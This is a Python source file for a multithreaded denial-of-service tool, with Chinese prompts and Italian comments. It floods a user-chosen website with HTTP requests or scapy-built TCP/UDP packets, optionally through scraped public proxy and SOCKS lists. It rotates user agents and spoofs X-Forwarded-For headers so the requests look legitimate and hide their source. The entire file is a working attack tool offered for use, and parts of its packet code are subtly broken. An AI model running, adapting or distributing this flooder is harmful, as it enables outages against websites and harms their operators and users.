import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
from bs4 import BeautifulSoup


try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
	from scapy.all import * # importa scapy
except: # altrimenti, se fallisce l'importazione
	print ("在此系统下不支持TCP / UDP洪水。 你必须使用HTTP.") # printa questo

print('''
by INDDOS
Edited by caoip.com
	''') # Author and Editor


useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G35 Safari/601.1",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.117 Safari/537.36 Puffin/7.1.2.18064AP",
			]


def starturl(): # Set a function for attack
	global url
	global url2
	global urlport

	url = input("\n请输入网址: ").strip()

	if url == "":
		print ("请输入网址.")
		starturl()

	try:
		if url[0]+url[1]+url[2]+url[3] == "www.":
			url = "http://" + url
		elif url[0]+url[1]+url[2]+url[3] == "http":
			pass
		else:
			url = "http://" + url
	except:
		print("你错了，再试一次.")
		starturl()

	try:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
	except:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

	try:
		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
	except:
		urlport = "80"

	floodmode()

def floodmode(): # The choice of mode
	global choice1
	choice1 = input('你的目标是 ' + url + " 输入“0”进行确认:")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # check if ROOT permission is enable
				print("您需要以root身份运行此程序才能使用TCP / UDP泛洪.") # printa questo
				exit(0) # exit
			else: # otherwise
				floodport() # continue
		except:
			pass
	elif choice1 == "2":
		try:
			if os.getuid() != 0:
				print("您需要以root身份运行此程序才能使用TCP / UDP泛洪.")
				exit(0)
			else:
				floodport()
		except:
			pass
	else:
		print ("你错了，再试一次.")
		floodmode()

def floodport():
	global port
	try:
		port = int(input("输入要测试的端口: "))
		portlist = range(65535)
		if port in portlist:
			pass
		else:
			print ("你错了，再试一次.")
			floodport()
	except ValueError:
		print ("你错了，再试一次.") # printa questo e
		floodport() # riparte la funzione e ti fa riscrivere
	proxymode()

def proxymode():
	global choice2
	choice2 = input("你想在攻击中使用代理/IP吗？ 如果你愿意，回答'y': ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("键入“0”以使用代理或键入“1”以使用socks: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("你错了，再试一次.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("您要下载新的代理列表吗？ 回答'y'来做: ")
	if choice4 == "y":
		urlproxy = "http://free-proxy-list.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("你想下载一个新的socks列表吗？ 回答'y'来做: ")
	if choice4 == "y":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("代理已成功下载.")
	except: # se succede qualche casino
		print ("\nERROR!\n")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def proxylist():
	global proxies
	out_file = str(input("输入proxylist文件名/路径（proxy.txt）: "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("输入线程数（默认为1000）： "))
	except ValueError:
		threads = 1000
		print ("1000 threads selected.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("请输入攻击倍数，推荐50-200 "))
	except ValueError:
		multiple = 100
		print("Multiple=100 is set\n")
		multiplication()
	begin()

def begin():
	choice6 = input("按“Enter”开始攻击: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": #lool
		loop()
	elif choice6 == "enter": #loool
		loop()
	else:
		exit(0)

def loop():
	global threads
	global get_host
	global acceptall
	global connection
	global go
	global x
	if choice1 == "0": # se si e' scelta la http flood, scrive gli header "statici" per non appesantire i threads
		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		] # header accept a caso per far sembrare le richieste più legittime
		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
	x = 0 # thanks therunixx, my friend
	go = threading.Event()
	if choice1 == "1": # se si e' scelto tcp flood
		if choice2 == "y": # e si e scelta la modalita' proxying
			if choice3 == "0": # e si sono scelti gli HTTP proxy
				for x in range(threads):
					TcpFloodProxed(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti
			else: # altrimenti se si sono scelto è il tcp flood con socks
				for x in range(threads):
					TcpFloodSocked(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti
		else: # se non si sono stati scelti proxy o socks
			for x in range(threads):
				TcpFloodDefault(x+1).start() # starta la classe apposita
				print ("Thread " + str(x) + " ready!")
			go.set() # questo fa avviare i threads appena sono tutti pronti
	else: # oppure:
		if choice1 == "2": # se si e' scelto l'UDP flood
			if choice2 == "y": # e si e' scelta la modalita' proxying
				if choice3 == "0": # e si sono scelti gli HTTP proxy
					for x in range(threads):
						UdpFloodProxed(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
				else: # se si sono scelti i socks
					for x in range(threads):
						UdpFloodSocked(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
			else: # se non si sono scelti proxy o socks per l'udp flood
				for x in range(threads):
					UdpFloodDefault(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti
		else: # se si è scelto l'http flood
			if choice2 == "y": # se abbiamo scelto la modalita' proxying
				if choice3 == "0": # e abbiamo scelto gli HTTP proxy
					for x in range(threads):
						RequestProxyHTTP(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
				else: # se abbiamo scelto i socks
					for x in range(threads):
						RequestSocksHTTP(x+1).start() # starta la classe apposita
						print ("Thread " + str(x) + " ready!")
					go.set() # questo fa avviare i threads appena sono tutti pronti
			else: # altrimenti manda richieste normali non proxate.
				for x in range(threads):
					RequestDefaultHTTP(x+1).start() # starta la classe apposita
					print ("Thread " + str(x) + " ready!")
				go.set() # questo fa avviare i threads appena sono tutti pronti

class TcpFloodProxed(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che tutti i proxy siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se si verifica un errore
				s.close() # chiude il thread e ricomincia

class TcpFloodSocked(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying via SOCKS
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se si verifica un errore
				s.close() # intanto chiude il precedente socket non funzionante
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
					s = socks.socksocket() # creazione socket
					s.connect((str(url2),int(port))) # connessione
					s.send(p) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
						s.close()
				except: # se nemmeno questo funge, allora il sock e' down
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # chiude il socket e ricomincia ciclo

class TcpFloodDefault(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		go.wait() # aspetta che tutti i threads siano pronti
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se qualcosa va storto
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione solito socket
				s.connect((str(url2),int(port))) # connessione al target
				s.send(p) # questo manda il pacchetto tcp creato al target
				print ("Request Sent! @", self.counter) # print richiesta + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se si verifica un errore
				s.close() # lo ignora e ricomincia il ciclo

class UdpFloodProxed(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads sono pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto
				s.close() # chiude il socket

class UdpFloodSocked(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per il proxying con SOCKS
				s = socks.socksocket() # creazione socket
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
				s.close() # intanto chiude il precedente socket non funzionante
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # poi prova ad utilizzare SOCKS4, magari e' questo il problema dell'errore
					s = socks.socksocket() # creazione socket
					s.connect((str(url2),int(port))) # connessione
					s.send(p) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
						s.close()
				except: # se nemmeno questo funge, allora il sock e' down
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # chiude il socket e ricomincia ciclo

class UdpFloodDefault(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
		go.wait() # aspetta che i threads siano pronti
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se si verifica qualche errore
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
				s.connect((str(url2),int(port))) # connessione al target
				s.send(p) # questo manda il pacchetto udp creato al target
				print ("Request Sent! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se si verifica un errore
				s.close() # lo ignora e ricomincia il ciclo

class RequestProxyHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
		accept = random.choice(acceptall) # scelta header accept a caso
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che i threads siano pronti
		while True: # ciclo infinito
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except:
				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia

class RequestSocksHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
		accept = random.choice(acceptall) # scelta accept a caso
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		current = x # per dare l'id al thread
		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
			proxy = proxies[current].strip().split(':')
		else: # altrimenti lo prende a random
			proxy = random.choice(proxies).strip().split(":")
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
				s = socks.socksocket() # creazione socket con pysocks
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
				s.close() # chiude socket
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
					s = socks.socksocket() # creazione nuovo socket
					s.connect((str(url2), int(urlport))) # connessione
					s.send (str.encode(request)) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
						s.close()
				except:
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.

class RequestDefaultHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
		accept = random.choice(acceptall) # accept a caso
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		go.wait() # aspetta che i threads siano pronti
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto
				s.close() # chiude socket e ricomincia


if __name__ == '__main__':
	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
